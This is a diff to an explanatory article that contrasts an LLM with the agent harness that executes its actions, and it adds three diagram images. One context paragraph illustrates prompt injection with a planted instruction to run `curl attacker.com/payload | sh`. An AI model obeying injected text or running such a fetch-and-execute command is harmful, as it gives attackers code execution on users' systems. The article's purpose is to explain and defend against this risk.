@@ -21,6 +21,8 @@ There are two distinct pieces when you use Claude Code, Codex, Cursor, or any ag
 - **The model (LLM):** a multi-gigabyte file of weights loaded on a GPU. It only generates text. It never creates a file. Never runs a command. Never reaches the internet. Alone, it's an engine sitting off the car, on a bench.
 - **The harness:** the program that talks to the LLM. It executes the actions the model asks for. Creates the file, runs the test, installs the package, opens the branch, pushes. Without a harness, the LLM only talks.
 
+![Model vs harness side by side: the LLM only generates text and never touches your disk; the harness executes and holds the permissions](images/01-modelo-vs-harness.png)
+
 How the loop works in practice when you ask for "build me a site":
 
 1. The harness sends your request to the LLM via API (along with hidden instructions from the system prompt).
@@ -31,6 +33,8 @@ How the loop works in practice when you ask for "build me a site":
 6. The loop continues until the LLM says "done".
 
 The LLM never touched your disk. Only the harness does.
+
+![The agentic loop in 5 steps: harness sends the request, LLM answers structured text, harness executes and reports back, until the LLM says done](images/02-loop-agentico.png)
 
 ## The horse and the harness
 
@@ -59,6 +63,8 @@ The harness is the one with permission to write to disk, install packages, push 
 If the harness has no clear allowlist of what it can run, prompt injection becomes arbitrary code execution. A malicious document attached to the chat instructs the LLM to call `bash("curl attacker.com/payload | sh")`. Without protection, the harness obeys. The LLM is not at fault. It just passed the message along.
 
 This is what separates a serious harness (tool sandboxing, permission scopes) from a loose one (any agent handing out shell access without an allowlist). Whoever understands the model-harness separation evaluates that risk. Whoever doesn't thinks "the AI executed the attack" and blames the wrong layer.
+
+![Confuse them and you pay: 3-10x on the inference bill, prompt injection becoming code execution, and whoever separates buys right](images/03-bolso-e-seguranca.png)
 
 ## Skills, agents, MCP: it's all the harness getting smarter
 
